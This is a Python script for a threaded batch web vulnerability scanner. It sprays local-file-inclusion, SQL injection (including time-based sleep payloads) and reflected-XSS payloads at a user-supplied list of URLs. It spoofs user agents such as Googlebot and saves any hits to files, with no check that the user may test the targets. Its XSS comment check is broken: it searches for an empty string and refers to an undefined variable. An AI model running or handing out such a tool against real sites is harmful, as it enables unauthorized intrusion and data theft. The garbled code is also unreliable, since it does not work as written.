#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import os
import random
import re
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
import sys
import threading
import concurrent.futures

# --- Constants ---
# Output Files
LFI_OUTPUT_FILE = "lfi_vulns.txt"
SQLI_OUTPUT_FILE = "sqli_vulns.txt"
XSS_OUTPUT_FILE = "xss_vulns.txt"

# Payload and Input Files (relative to script location)
PAYLOAD_DIR = "payloads"
LFI_PAYLOAD_FILE = os.path.join(PAYLOAD_DIR, "lfi_payloads.txt")
SQLI_PAYLOAD_FILE = os.path.join(PAYLOAD_DIR, "sql_payloads.txt")
XSS_PAYLOAD_FILE = os.path.join(PAYLOAD_DIR, "xss_payloads.txt")
HASH_SAMPLE_FILE = os.path.join(PAYLOAD_DIR, "hash_samples.txt")
USER_AGENTS_FILE = os.path.join(PAYLOAD_DIR, "user_agents.txt")

# Scanner Settings
DEFAULT_USER_AGENT = "FastThreadedScanner/1.6" # Keep UA version consistent
TIME_BASED_SLEEP_DURATION = 5 # seconds
TIME_BASED_THRESHOLD = TIME_BASED_SLEEP_DURATION * 0.8
REQUEST_TIMEOUT = TIME_BASED_SLEEP_DURATION + 7
MAX_WORKERS = 20 # Number of concurrent threads


# --- Global Variables & Locks ---
LOADED_USER_AGENTS = []
LOG_LOCK = threading.Lock() # For thread-safe printing
FILE_LOCK = threading.Lock() # For thread-safe file writing

# --- Core Functions ---

def safe_log(msg):
    """Thread-safe logging function with timestamp."""
    with LOG_LOCK:
        # Use current time from context if available, otherwise use system time
        try:
            # This part relies on the context block providing current time
            # As a fallback, we'll use system time if context isn't directly usable here.
             timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        except NameError: # Fallback if context isn't magically available
             timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        print(f"[{timestamp}] {msg}")


def make_request(url, headers=None):
    """
    Makes a GET request with rotated UA. (Thread-safe reads of globals)
    Returns: (response object | None, response text chunk | None, duration float)
    """
    global LOADED_USER_AGENTS # Read access is safe
    global DEFAULT_USER_AGENT # Read access is safe

    if LOADED_USER_AGENTS:
        selected_ua = random.choice(LOADED_USER_AGENTS)
    else:
        selected_ua = DEFAULT_USER_AGENT

    final_headers = {"User-Agent": selected_ua}
    if headers:
        final_headers.update(headers)
        final_headers["User-Agent"] = selected_ua

    start_time = time.time()
    response = None
    response_text = None
    try:
        response = requests.get(
            url, headers=final_headers, timeout=REQUEST_TIMEOUT,
            verify=False, allow_redirects=False, stream=True
        )
        content_chunk = response.raw.read(1024 * 10, decode_content=True)
        response_text = content_chunk.decode('utf-8', errors='ignore')
        response.close()
    except requests.exceptions.Timeout: pass
    except requests.exceptions.RequestException: pass
    except Exception: pass
    finally:
        duration = time.time() - start_time
    return response, response_text, duration

def save_finding(filename, finding_text):
    """Thread-safe function to append a finding to a file."""
    global FILE_LOCK # Use the global file lock
    try:
        with FILE_LOCK: # Acquire lock before writing
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"{finding_text}\n")
    except IOError as e:
        safe_log(f"[-] CRITICAL: Error saving finding to {filename}: {e}")
    except Exception as e:
        safe_log(f"[-] CRITICAL: Unexpected error saving finding: {e}")

# --- Test Functions (Updated to use safe_log, save_finding) ---

def test_lfi_payloads(base_url):
    """Tests for LFI vulnerabilities (uses safe_log, save_finding)."""
    if not os.path.exists(LFI_PAYLOAD_FILE): return

    lfi_indicators = [
        "root:x:0:0:", "\[boot loader\]", "windows\\system32\\drivers\\etc\\hosts",
        "servlet-mapping", "db_username", "<?php", "root:.*?:[0-9]*:[0-9]*:",
        "odbcconnection", "javax.servlet", "applicationcontext", "web-inf",
    ]
    common_lfi_params = ["file", "page", "path", "include", "document", "view", "dir", "cat", "folder", "item", "name", "pg"]
    found_lfi_target = False

    try:
        with open(LFI_PAYLOAD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip()]

        for lfi_param in common_lfi_params:
            if found_lfi_target: break
            for payload in payloads:
                try:
                    parsed_url = urlparse(base_url)
                    query = parse_qs(parsed_url.query)
                    query[lfi_param] = payload
                    url_parts = list(parsed_url)
                    url_parts[4] = urlencode(query, doseq=True)
                    url = urlunparse(url_parts)
                except Exception: continue

                response, response_text, _ = make_request(url)

                if response and response_text:
                    response_text_lower = response_text.lower()
                    for indicator in lfi_indicators:
                        is_hit = False
                        if indicator.startswith("root:") and indicator.endswith(":"):
                            if re.search(indicator, response_text): is_hit = True
                        elif indicator.lower() in response_text_lower: is_hit = True

                        if is_hit:
                            finding = f"[Target: {base_url}] [!] LFI Possible (Indicator: {indicator}) → URL: {url}"
                            safe_log(finding)
                            save_finding(LFI_OUTPUT_FILE, finding)
                            found_lfi_target = True
                            break

    except FileNotFoundError: pass
    except Exception as e:
        safe_log(f"[-] LFI test error for {base_url}: {e}")


def test_sql_payloads(base_url, param_name):
    """Tests for SQL injection (uses safe_log, save_finding)."""
    if not os.path.exists(SQLI_PAYLOAD_FILE): return

    sql_error_indicators = ["sql syntax", "syntax error", "unclosed quotation mark", "mysql", "sql server", "oracle", "ora-", "odbc", "invalid input", "pg_", "you have an error in your sql syntax"]
    time_based_triggers = ["SLEEP(", "WAITFOR DELAY"]

    try:
        with open(SQLI_PAYLOAD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
             payloads = [line.strip() for line in f if line.strip()]

        for payload in payloads:
            is_time_based = any(trigger.lower() in payload.lower() for trigger in time_based_triggers)
            try:
                parsed_url = urlparse(base_url)
                query = parse_qs(parsed_url.query)
                query[param_name] = payload
                url_parts = list(parsed_url)
                url_parts[4] = urlencode(query, doseq=True)
                url = urlunparse(url_parts)
            except Exception: continue

            response, response_text, duration = make_request(url)

            # Error-Based Check
            if response and response_text and any(err.lower() in response_text.lower() for err in sql_error_indicators):
                finding = f"[Target: {base_url}] [!] SQLi Possible (Error Based) → Param: {param_name}, Payload: {payload}"
                safe_log(finding)
                save_finding(SQLI_OUTPUT_FILE, finding)
                continue

            # Time-Based Check
            if is_time_based:
                timed_out_suspiciously = (response is None and duration >= REQUEST_TIMEOUT * 0.95)
                if duration >= TIME_BASED_THRESHOLD or timed_out_suspiciously:
                    finding = f"[Target: {base_url}] [!] SQLi Possible (Time Based: {duration:.2f}s) → Param: {param_name}, Payload: {payload}"
                    safe_log(finding)
                    save_finding(SQLI_OUTPUT_FILE, finding)
                    continue

    except FileNotFoundError: pass
    except Exception as e:
        safe_log(f"[-] SQLi test error for {base_url} / {param_name}: {e}")


def test_xss_payloads(base_url, param_name):
    """Tests for reflected XSS (uses safe_log, save_finding)."""
    if not os.path.exists(XSS_PAYLOAD_FILE): return

    try:
        with open(XSS_PAYLOAD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
             payloads = [line.strip() for line in f if line.strip()]
        for payload in payloads:
            try:
                parsed_url = urlparse(base_url)
                query = parse_qs(parsed_url.query)
                query[param_name] = payload
                url_parts = list(parsed_url)
                url_parts[4] = urlencode(query, doseq=True)
                url = urlunparse(url_parts)
            except Exception: continue

            response, response_text, _ = make_request(url)

            if response and response_text and payload in response_text:
                if any(c in payload for c in '<>"\'()")') and not all(c in '&lt;&gt;&amp;&quot;&#39;' for c in payload):
                     is_in_comment = False
                     try:
                         index = response_text.find(payload)
                         if index != -1:
                             comment_start = response_text.rfind('', index + len(payload))
                             is_in_comment = (comment_start != -1 and (comment_end == -1 or comment_end >= index + len(payload)))
                     except Exception: pass

                     if not is_in_comment:
                         finding = f"[Target: {base_url}] [!] XSS Possible (Reflected) → Param: {param_name}, Payload: {payload}"
                         safe_log(finding)
                         save_finding(XSS_OUTPUT_FILE, finding)
                         break

    except FileNotFoundError: pass
    except Exception as e:
        safe_log(f"[-] XSS test error for {base_url} / {param_name}: {e}")


def detect_hash_type_and_guess():
    """Analyzes hashes from a file and guesses the type."""
    safe_log("[*] Analyzing hashes...")
    if not os.path.exists(HASH_SAMPLE_FILE):
        safe_log(f"[-] Hash sample file not found: {HASH_SAMPLE_FILE}. Skipping hash analysis.")
        return
    try:
        with open(HASH_SAMPLE_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            hashes = [line.strip() for line in f if line.strip()]
        if not hashes:
            safe_log("[-] Hash sample file is empty.")
            return

        safe_log(f"[*] Analyzing {len(hashes)} hash(es) from {HASH_SAMPLE_FILE}...")
        for h in hashes:
            log_msg = f"[?] {h[:40]}... → Unknown hash type"
            h_lower = h.lower()
            h_len = len(h)
            is_hex = all(c in '0123456789abcdef' for c in h_lower)
            if is_hex:
                if h_len == 32: log_msg = f"[+] {h} → Possible MD5 / NTLM"
                elif h_len == 40: log_msg = f"[+] {h} → Possible SHA1"
                elif h_len == 64: log_msg = f"[+] {h} → Possible SHA256"
                elif h_len == 56: log_msg = f"[+] {h} → Possible SHA224"
                elif h_len == 96: log_msg = f"[+] {h} → Possible SHA384"
                elif h_len == 128: log_msg = f"[+] {h} → Possible SHA512"
            elif h.startswith(("$2a$", "$2b$", "$2y$")) and h_len >= 59: log_msg = f"[+] {h[:40]}... → Possible bcrypt"
            elif h.startswith("$1$") and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible MD5-Crypt"
            elif h.startswith("$5$") and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible SHA256-Crypt"
            elif h.startswith("$6$") and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible SHA512-Crypt"
            elif ("$argon2id$" in h or "$argon2i$" in h or "$argon2d$" in h) and h_len > 40 : log_msg = f"[+] {h[:40]}... → Possible Argon2"
            elif h.startswith("{SSHA}") and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible SSHA (LDAP)"
            elif h.startswith(("$md5", "$apr1")) and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible MD5-Crypt (Apache)"
            safe_log(log_msg)
    except FileNotFoundError: safe_log(f"[-] Hash sample file missing: {HASH_SAMPLE_FILE}")
    except Exception as e: safe_log(f"[-] Hash analysis error: {e}")
    safe_log("[*] Hash analysis finished.")

# --- Utility ---

def load_user_agents(filepath, default_ua):
    """Loads user agents from file, returns list or default."""
    uas = []
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                uas = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if uas:
                safe_log(f"[*] Loaded {len(uas)} user agents from {filepath}")
                return uas
            else:
                safe_log(f"[-] User agent file '{filepath}' is empty. Using default.")
                return [default_ua]
        else:
            safe_log(f"[-] User agent file '{filepath}' not found. Using default.")
            return [default_ua]
    except Exception as e:
        safe_log(f"[-] Error loading user agents from {filepath}: {e}. Using default.")
        return [default_ua]

def prepare_payload_files():
    """Checks for payload dir/files and creates dummies if missing."""
    global PAYLOAD_DIR

    if not os.path.exists(PAYLOAD_DIR):
        try:
            os.makedirs(PAYLOAD_DIR)
            safe_log(f"[*] Created payload directory: {PAYLOAD_DIR}")
        except OSError as e:
            safe_log(f"[-] CRITICAL: Failed to create directory {PAYLOAD_DIR}: {e}. Exiting.")
            return False

    dummy_contents = {
        LFI_PAYLOAD_FILE: "../../../../etc/passwd\n../../../../boot.ini\n../../../../windows/system32/drivers/etc/hosts\nWEB-INF/web.xml\n",
        SQLI_PAYLOAD_FILE: (
            "' OR '1'='1-- \n" "\" OR \"1\"=\"1-- \n" "' UNION SELECT null, @@version -- \n"
            f"' AND SLEEP({TIME_BASED_SLEEP_DURATION}) -- \n" f"1; WAITFOR DELAY '0:0:{TIME_BASED_SLEEP_DURATION}' -- \n"
            f"SELECT pg_sleep({TIME_BASED_SLEEP_DURATION}) -- \n" "benchmark(5000000, sha1(1)) -- \n"
            ),
        XSS_PAYLOAD_FILE: (
            "<script>alert('XSS1')</script>\n" "<img src=x onerror=alert('XSS2')>\n" "'\"><svg/onload=alert('XSS3')>\n"
            "javascript:alert('XSS4')\n" "\" autofocus onfocus=alert('XSS5')//\n" "<iframe src=\"javascript:alert('XSS6')\"></iframe>\n"
            ),
        HASH_SAMPLE_FILE: (
            "5f4dcc3b5aa765d61d8327deb882cf99\n" "$2y$10$ExampleHashExampleHashExampleHashExampleHashExampleHashEx\n"
            "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\n" "$6$rounds=5000$usesomesillystri$K.9GN.DF./JWDu04Dmy.J8rDB5imQdWYF9.iN.vqPv4hrtQRgRKIAa9ssop./Ld5nEs1x2cFyskcg.7eb/Z1.\n"
            ),
        USER_AGENTS_FILE: (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1\n"
            "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n"
            "Googlebot/2.1 (+http://www.google.com/bot.html)\n" f"{DEFAULT_USER_AGENT}\n"
            )
    }

    all_files_ok = True
    for fpath, content in dummy_contents.items():
        if not os.path.exists(fpath):
            try:
                os.makedirs(os.path.dirname(fpath), exist_ok=True)
                with open(fpath, 'w', encoding='utf-8') as f:
                    f.write(content)
                safe_log(f"[*] Created dummy file: {fpath}")
            except IOError as e:
                safe_log(f"[-] CRITICAL: Failed to create dummy file {fpath}: {e}")
                all_files_ok = False
            except Exception as e:
                 safe_log(f"[-] CRITICAL: Unexpected error creating dummy file {fpath}: {e}")
                 all_files_ok = False

    essential_payload_files = [SQLI_PAYLOAD_FILE, XSS_PAYLOAD_FILE, LFI_PAYLOAD_FILE, USER_AGENTS_FILE]
    for fpath in essential_payload_files:
        if not os.path.exists(fpath):
            safe_log(f"[-] WARNING: Essential payload file missing: {fpath}")
            if fpath != USER_AGENTS_FILE: all_files_ok = False

    output_files = [LFI_OUTPUT_FILE, SQLI_OUTPUT_FILE, XSS_OUTPUT_FILE]
    for fpath in output_files:
        try:
            with open(fpath, 'a', encoding='utf-8'): pass
        except IOError as e:
             safe_log(f"[-] CRITICAL: Cannot write to output file {fpath}: {e}")
             all_files_ok = False
        except Exception as e:
             safe_log(f"[-] CRITICAL: Unexpected error accessing output file {fpath}: {e}")
             all_files_ok = False

    return all_files_ok

# --- Scan Task Function (for threading) ---

def scan_single_target(base_url, sqli_params_list, xss_params_list, target_index, total_targets):
    """Runs all scans for a single target URL."""
    # This function encapsulates the work done by each thread.
    # It calls the individual test functions which handle their own logging/saving.
    try:
        test_lfi_payloads(base_url)

        if sqli_params_list:
            for param in sqli_params_list:
                test_sql_payloads(base_url, param)

        if xss_params_list:
            for param in xss_params_list:
                 test_xss_payloads(base_url, param)
        return True # Indicate success
    except Exception as e:
        # Log any unexpected error within the target scanning process
        safe_log(f"[!] EXCEPTION during scan for Target {target_index}/{total_targets} ({base_url}): {e}")
        return False # Indicate failure


# --- Main Execution ---

def run_tests():
    """Gets target list file and runs scans concurrently using threads."""
    global LOADED_USER_AGENTS

    start_run_time = time.time()

    safe_log("--- Fast Threaded Batch Vulnerability Scanner ---")
    safe_log(f"Payloads directory: '{PAYLOAD_DIR}'")
    safe_log(f"Findings saved to: {LFI_OUTPUT_FILE}, {SQLI_OUTPUT_FILE}, {XSS_OUTPUT_FILE}")
    safe_log(f"Max concurrent threads: {MAX_WORKERS}")
    safe_log("-" * 30)

    if not prepare_payload_files():
        safe_log("[-] Errors preparing payload/output files. Cannot continue reliably. Exiting.")
        sys.exit(1)

    LOADED_USER_AGENTS = load_user_agents(USER_AGENTS_FILE, DEFAULT_USER_AGENT)
    safe_log("-" * 30)

    # Get Target File
    target_list_file = input("Enter filename containing list of target URLs (one per line): ").strip()
    if not target_list_file:
        safe_log("[-] No target file provided. Exiting.")
        sys.exit(1)

    # Read Target URLs
    target_urls_from_file = []
    try:
        with open(target_list_file, 'r', encoding='utf-8', errors='ignore') as f:
            target_urls_from_file = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        if not target_urls_from_file:
            safe_log(f"[-] Target file '{target_list_file}' is empty or contains no valid URLs. Exiting.")
            sys.exit(1)
        safe_log(f"[*] Loaded {len(target_urls_from_file)} target(s) from {target_list_file}")
    except FileNotFoundError:
        safe_log(f"[-] Target file not found: {target_list_file}. Exiting.")
        sys.exit(1)
    except Exception as e:
        safe_log(f"[-] Error reading target file {target_list_file}: {e}. Exiting.")
        sys.exit(1)

    # Get Parameters for tests
    sqli_params_str = input("Parameter name(s) for SQLi (comma-separated, e.g., id,user): ").strip()
    xss_params_str = input("Parameter name(s) for XSS (comma-separated, e.g., query,search): ").strip()
    sqli_params_list = [p.strip() for p in sqli_params_str.split(',') if p.strip()]
    xss_params_list = [p.strip() for p in xss_params_str.split(',') if p.strip()]
    safe_log("-" * 30)

    # --- Start Threaded Scan Execution ---
    start_scan_exec_time = time.time()
    original_total_targets = len(target_urls_from_file)
    safe_log(f"[*] Starting scans on {original_total_targets} potential target(s) using up to {MAX_WORKERS} threads...")

    futures = []
    tasks_submitted = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for i, base_url_from_file in enumerate(target_urls_from_file):
            scan_url = base_url_from_file.strip()
            original_input_url = scan_url

            # Auto-prefix with http:// if scheme is missing
            if '://' not in scan_url:
                safe_log(f"[*] URL '{original_input_url}' missing scheme, prepending 'http://'.")
                scan_url = f"http://{original_input_url}"
            elif not (scan_url.startswith('http://') or scan_url.startswith('https://')):
                 safe_log(f"[!] Skipping unsupported scheme in URL: {scan_url}")
                 continue # Skip this URL

            # Submit the task
            futures.append(executor.submit(
                scan_single_target, scan_url, sqli_params_list, xss_params_list,
                i + 1, original_total_targets
            ))
            tasks_submitted += 1

        safe_log(f"[*] Submitted {tasks_submitted} scan tasks. Waiting for completion...")
        processed_count = 0
        # Wait for results using as_completed
        for future in concurrent.futures.as_completed(futures):
            processed_count += 1
            try:
                result = future.result() # Check for exceptions from thread
            except Exception as exc:
                # Log exception from thread, continue processing others
                safe_log(f'[!] THREAD EXCEPTION: An error occurred during scan: {exc}')

    scan_duration = time.time() - start_scan_exec_time
    safe_log(f"[*] Web scanning phase completed for {tasks_submitted} submitted targets in {scan_duration:.2f} seconds.")
    safe_log("-" * 30)

    # --- Run Hash Analysis (sequentially after web scans) ---
    detect_hash_type_and_guess()

    # --- End Scan Execution ---
    end_run_time = time.time()
    safe_log("-" * 30)
    safe_log(f"[*] All tasks finished in {end_run_time - start_run_time:.2f} seconds.")

    # Report findings summary
    output_files_found = {"LFI": LFI_OUTPUT_FILE, "SQLi": SQLI_OUTPUT_FILE, "XSS": XSS_OUTPUT_FILE}
    found_any = False
    for vuln_type, fpath in output_files_found.items():
        try:
            # Check if file exists and is not empty
            if os.path.exists(fpath) and os.path.getsize(fpath) > 0:
                safe_log(f"[!] Check '{fpath}' for potential {vuln_type} findings.")
                found_any = True
        except OSError:
             safe_log(f"[-] Could not check status of output file: {fpath}")

    if not found_any:
         safe_log("[*] No potential LFI, SQLi, or XSS findings were saved.")


if __name__ == "__main__":
    # Disable warnings for insecure HTTPS requests (verify=False)
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except ImportError:
        try: requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
        except AttributeError: safe_log("[-] Could not disable InsecureRequestWarning.")

    # --- Run the main function ---
    run_tests()
    # --- Exit ---
    safe_log("[*] Script finished.")
    sys.exit(0)
